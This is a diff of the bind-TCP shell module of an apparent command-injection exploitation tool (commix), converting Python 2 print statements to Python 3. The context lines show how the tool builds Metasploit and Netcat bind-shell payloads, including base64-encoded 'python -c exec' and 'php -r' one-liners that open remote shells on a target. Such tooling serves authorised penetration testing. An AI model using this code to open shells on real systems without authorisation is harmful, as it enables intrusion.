@@ -29,7 +29,7 @@ Check for available shell options.
 def shell_options(option):
   if option.lower() == "bind_tcp":
     warn_msg = "You are already into the '" + option.lower() + "' mode."
-    print settings.print_warning_msg(warn_msg)
+    print(settings.print_warning_msg(warn_msg))
   elif option.lower() == "?": 
     menu.reverse_tcp_options()
   elif option.lower() == "quit": 
@@ -40,7 +40,7 @@ def shell_options(option):
     if option[4:10].lower() == "lhost ":
       err_msg =  "The '" + option[4:9].upper() + "' option, is not "
       err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
-      print settings.print_error_msg(err_msg)  
+      print(settings.print_error_msg(err_msg))  
     if option[4:10].lower() == "lport ":
       check_lport(option[10:])
   else:
@@ -59,14 +59,14 @@ Error msg if the attack vector is available only for Windows targets.
 """
 def windows_only_attack_vector():
     error_msg = "This attack vector is available only for Windows targets."
-    print settings.print_error_msg(error_msg)
+    print(settings.print_error_msg(error_msg))
 
 """
 Message regarding the MSF handler.
 """
 def msf_launch_msg(output):
     info_msg = "Type \"msfconsole -r " + os.path.abspath(output) + "\" (in a new window)."
-    print settings.print_info_msg(info_msg)
+    print(settings.print_info_msg(info_msg))
     info_msg = "Once the loading is done, press here any key to continue..."
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdin.readline().replace("\n","")
@@ -98,7 +98,7 @@ def set_php_working_dir():
       break
     else:
       err_msg = "'" + php_dir + "' is not a valid answer."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
 """
@@ -126,7 +126,7 @@ def set_python_working_dir():
       break
     else:
       err_msg = "'" + python_dir + "' is not a valid answer."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
 """
@@ -134,7 +134,7 @@ check / set rhost option for bind TCP connection
 """
 def check_rhost(rhost):
   settings.RHOST = rhost
-  print "RHOST => " + settings.RHOST
+  print("RHOST => " + settings.RHOST)
   return True
 
 """
@@ -144,11 +144,11 @@ def check_lport(lport):
   try:  
     if float(lport):
       settings.LPORT = lport
-      print "LPORT => " + settings.LPORT
+      print("LPORT => " + settings.LPORT)
       return True
   except ValueError:
     err_msg = "The provided port must be numeric (i.e. 1234)"
-    print settings.print_error_msg(err_msg)
+    print(settings.print_error_msg(err_msg))
     return False
 
 
@@ -200,7 +200,7 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbs
     # Invalid command    
     else:
       err_msg = "The '" + nc_version + "' option, is not valid."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       continue
 
   while True:
@@ -222,7 +222,7 @@ Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbs
       raise SystemExit()
     else:
       err_msg = "'" + enable_bin_dir + "' is not a valid answer."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
   if nc_version != '4':
@@ -259,7 +259,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print settings.print_error_msg(error_msg)
+        print(settings.print_error_msg(error_msg))
         continue
 
       payload = "php/bind_php"
@@ -278,7 +278,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -295,7 +295,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
 
       break
 
@@ -350,7 +350,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print settings.print_error_msg(error_msg)
+        print(settings.print_error_msg(error_msg))
         continue
 
       payload = "php/meterpreter/bind_tcp"
@@ -369,7 +369,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = content_file.readlines()
           data = ''.join(data).replace("\n"," ")
 
-        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -386,7 +386,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "php -r \"" + data + "\""
         msf_launch_msg(output)
       except:
-        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
       break
 
     # Python-bind-shell(meterpreter)
@@ -394,7 +394,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
 
       if not os.path.exists(settings.METASPLOIT_PATH):
         error_msg = settings.METASPLOIT_ERROR_MSG
-        print settings.print_error_msg(error_msg)
+        print(settings.print_error_msg(error_msg))
         continue
 
       payload = "python/meterpreter/bind_tcp"
@@ -414,7 +414,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           data = ''.join(data)
           data = base64.b64encode(data)
 
-        print "[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]"
+        print("[" + Fore.GREEN + " SUCCEED " + Style.RESET_ALL + "]")
         # Remove the ouput file.
         os.remove(output)
         with open(output, 'w+') as filewrite:
@@ -431,7 +431,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
           other_shell = "python -c \"exec('" + data + "'.decode('base64'))\""
         msf_launch_msg(output)
       except:
-        print "[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]"
+        print("[" + Fore.RED + " FAILED " + Style.RESET_ALL + "]")
       break
     # Check for available shell options  
     elif any(option in other_shell.lower() for option in settings.SHELL_OPTIONS):
@@ -440,7 +440,7 @@ Type '""" + Style.BRIGHT + """8""" + Style.RESET_ALL + """' to use a Python mete
     # Invalid option
     else:
       err_msg = "The '" + other_shell + "' option, is not valid."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       continue
 
   return other_shell
@@ -459,7 +459,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other bind TCP s
 
     if bind_tcp_option.lower() == "bind_tcp": 
       warn_msg = "You are already into the '" + bind_tcp_option.lower() + "' mode."
-      print settings.print_warning_msg(warn_msg)
+      print(settings.print_warning_msg(warn_msg))
       continue
 
     # Option 1 - Netcat shell
@@ -485,7 +485,7 @@ Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other bind TCP s
     # Invalid option
     else:
       err_msg = "The '" + bind_tcp_option + "' option, is not valid."  
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       continue
 
 
@@ -501,7 +501,7 @@ def configure_bind_tcp(separator):
     option = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """)
     if option.lower() == "bind_tcp": 
       warn_msg = "You are already into the '" + option.lower() + "' mode."
-      print settings.print_warning_msg(warn_msg)
+      print(settings.print_warning_msg(warn_msg))
       continue
     elif option.lower() == "?": 
       menu.bind_tcp_options()
@@ -529,7 +529,7 @@ def configure_bind_tcp(separator):
       elif option[4:10].lower() == "lhost ":
         err_msg =  "The '" + option[4:9].upper() + "' option, is not "
         err_msg += "usable for 'bind_tcp' mode. Use 'RHOST' option."
-        print settings.print_error_msg(err_msg)  
+        print(settings.print_error_msg(err_msg))  
         continue  
       elif option[4:10].lower() == "lport ":
         if check_lport(option[10:]):
@@ -541,11 +541,11 @@ def configure_bind_tcp(separator):
           continue
       else:
         err_msg = "The '" + option + "' option, is not valid."
-        print settings.print_error_msg(err_msg)
+        print(settings.print_error_msg(err_msg))
         pass
     else:
       err_msg = "The '" + option + "' option, is not valid."
-      print settings.print_error_msg(err_msg)
+      print(settings.print_error_msg(err_msg))
       pass
 
 # eof
